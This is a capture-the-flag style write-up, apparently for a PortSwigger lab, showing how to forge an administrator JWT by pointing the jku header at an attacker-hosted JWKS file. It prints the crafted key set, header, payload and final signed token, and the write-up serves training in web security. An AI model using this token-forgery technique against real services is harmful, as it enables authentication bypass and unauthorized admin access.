# JWT Authentication Bypass — JKU Header Injection

This lab uses JWTs to manage sessions. The server honors the `jku` parameter in a JWT's header, but doesn't verify that the referenced URL belongs to a trusted domain before fetching a key from it.

**Goal:** Forge a JWT that grants access to the admin panel at `/admin`, then delete the user `carlos`.

Login credentials for your own account: wiener:peter

Tip: Getting comfortable with handling JWTs in Burp Suite beforehand is recommended.

---

**References:**
- https://portswigger.net/web-security/jwt
- https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c

<img width="773" height="809" alt="1" src="https://github.com/user-attachments/assets/168daede-6901-462a-8fbf-466046f1e9ce" />


---

The path `/.well-known/jwks.json` doesn't appear to exist on the target:

<img width="380" height="96" alt="2" src="https://github.com/user-attachments/assets/2dc90b68-15b9-49d8-a1df-d04072108901" />


First, the public half of an RSA key pair was copied:

<img width="537" height="215" alt="3" src="https://github.com/user-attachments/assets/77ab4595-32e5-4ba1-9de5-1b8477a296e3" />


Then a file named `/jwks.json` was created on the exploit server, including the `"use": "sig"` field:

<img width="847" height="720" alt="4" src="https://github.com/user-attachments/assets/67026c2f-bc88-4958-b8b2-517a345a3467" />

<img width="839" height="660" alt="5" src="https://github.com/user-attachments/assets/eea2f1fd-cd80-4011-9b43-8066a2cdeca2" />


```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
            "n": "zdCdoh120Xnv9C_UywxJX78dtqOyMS42cXfmnjTYEuShgMd4yABQeUuObibikuytdaopdW0PtY1Q2AYOg0H6A4iBbTzRHNaN85IOb5J7mgiHHp7oIjDlQ6wajZsraj3US4hX3TdK3gcEG-h0EWpSh9A34yfq3HCKLdEVbV0XgRmI3N6Nc_VX5aIcGkoALHZBd9g179CfBtvtUu3cFPZA8eC9iv5xv1AyO4IdlOVdKjNernPu94LzzyYlHObHHWj-BaC5Px4J0jDymdPc9HaLm67nlA0aqZ6KA4HwzZHGJEb2UO_-Ya1HCsRhrnz2e2QRPVAOHgQkPWMKJb6vOFU5OQ"
        }
    ]
}
```

A new JWT was then crafted:

<img width="1068" height="776" alt="6" src="https://github.com/user-attachments/assets/bb495f0f-9e6a-4198-8fef-412f2528333b" />


Header, including:

- The same `kid` as the uploaded public key
- A `jku` value pointing to the file hosted on the exploit server

```
{
  "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
  "alg": "RS256",
  "jku": "https://exploit-0a3700d5034894e7808139f701b000a7.exploit-server.net/jwks.json"
}
```

Payload, with the `sub` field changed to the administrator user:

``` 
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683792794
}
``` 

Resulting JWT:

```
eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTM3MDBkNTAzNDg5NGU3ODA4MTM5ZjcwMWIwMDBhNy5leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTI3OTR9.mY28w-Jf8fMZzO_9qNug5rWXMG8bQq-zpuQLmsQnPPjLziXt5vHOESQeZcCs5wZaagVwkXU9IuRW0mvXsM5AwvuCDG1K22XIP_mL2-RNBQpN_qOE1HVJPIdy-Iq0F1V1DgEAYcNo9QQgcxX1AmhW9AQ0urD4qnLGk8leZYX-J4okBw-583qj2NsgX5zPan_JJ0bqupysw1cy8G9eR4h57wV1wM5oOiGhS5fX2gasKq5RSv4TUQ0Rk6FwONnmNhFJMNKn7HYRxGeoDv-A1118w49G6QSDqWsSuuFgCPy2oLQ-TGMDJBBDBGUNNy-serxOKJ7JjkY9qp1sC9E5hekzHQ
``` 

<img width="800" height="561" alt="7" src="https://github.com/user-attachments/assets/2c0d3b90-1f32-45cd-b079-6e841301f071" />


If done directly through Burp's interface instead:

<img width="507" height="738" alt="8" src="https://github.com/user-attachments/assets/c828f330-65f6-4800-b772-87f059c99a10" />

